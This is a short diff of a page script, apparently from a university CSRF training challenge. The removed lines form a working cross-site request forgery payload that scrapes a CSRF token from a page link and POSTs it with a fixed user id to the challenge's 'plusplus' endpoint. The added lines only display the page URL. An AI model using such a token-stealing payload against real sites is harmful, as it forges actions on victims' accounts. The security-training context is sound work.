@@ -1,13 +1,5 @@
+<a id="ref"></a>
+
 <script>
-    _csrfToken = document.links[71].href.split("csrfToken=")[1];
-    $.ajax({
-	    dataType: "text",
-	    type: "POST",
-	    url: "https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus ",
-	    data: {
-		    userid: "86109c9eed773b92480275854966986d3c4901a6",
-		    csrfToken: _csrfToken
-	    },
-	    async: false
-    });
+    document.getElementById("ref").innerHTML = window.location.href;
 </script>
